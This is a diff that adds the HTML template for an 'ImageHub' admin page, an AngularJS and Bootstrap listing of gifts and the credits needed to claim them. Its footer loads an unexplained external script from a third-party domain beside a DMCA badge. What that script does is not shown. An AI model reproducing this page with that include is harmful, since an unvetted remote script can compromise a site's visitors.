@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>ImageHub</title>
+
+  <link rel="stylesheet" href="/stylesheets/bootstrap.min.css">
+        <link rel="stylesheet" href="/stylesheets/bootstrap-theme.min.css">
+
+    <script src="javascripts/jquery-1.11.3.min.js"></script>
+<script src="/javascripts/bootstrap.min.js"></script>
+
+<style type="text/css">
+    .bs-example{
+      margin: 20px;
+    }
+  body { background: #000001 !important;
+      margin-top:20px;
+}
+  footer {
+          float: right;
+          height: 35px;
+          margin: 0px 50px 0px 0px;
+          color: #000;
+          text-align: right;
+          padding: 10px 30px;
+          width: 180px;
+      }
+p.user {
+    width: 320px;
+    padding: 5px;
+    margin: 0px;
+    background:white;
+}
+.comments{
+    border: 2px solid;
+    padding: 5px;
+    border-top-right-radius: 2em;
+}
+</style>
+<link rel="stylesheet" type="text/css" href="/stylesheets/themeline.css">
+<script src="/javascripts/angular.min.js"></script>
+<script src="/javascripts/admin-themeline.js"></script>
+<link rel="shortcut icon" href="/images/logo1.png">
+
+</head>
+
+<body ng-app="ImageHub">
+
+<div ng-controller="MainCtrl" >
+<div class="container">
+  <div class="page-header">
+        <ul class="nav nav-tabs">
+          <li><a href="/logout">Logout</a></li>
+          <li><a href="/admin-profile">Admin Account</a></li>
+
+        </ul>
+  </div>
+
+<div class="jumbotron text-center">
+
+</div>
+<div ng-repeat="gift in gifts" class="col-md-6"><br>
+ <figure>
+  
+  <img ng-src="/images/{{gift.path}}" class="img-rounded" alt="picture"><br><br><br><br>
+ </figure>
+ <div class="col-md-0">
+   <a href="#" data-toggle="tooltip" title="Credits Required to claim"> <h2 class="text-primary"><span class="label label-primary pull-right">{{gift.credit}}</span></h2>      
+  </div>
+   
+</div>
+</div>
+</div>
+
+</div>
+
+<footer>
+          <a href="http://www.dmca.com/Protection/Status.aspx?ID=ed7716f1-be0a-4c39-8b9a-988b7d28e39c" title="DMCA.com Protection Status" class="dmca-badge"> <img src="/images/dmca_protected.png" alt="DMCA.com Protection Status"></a>  <script src="https://webcdn.streamtest.net/streamtest.js" type="text/javascript"></script> 
+</footer>
+
+
+</body>
+
+</html>
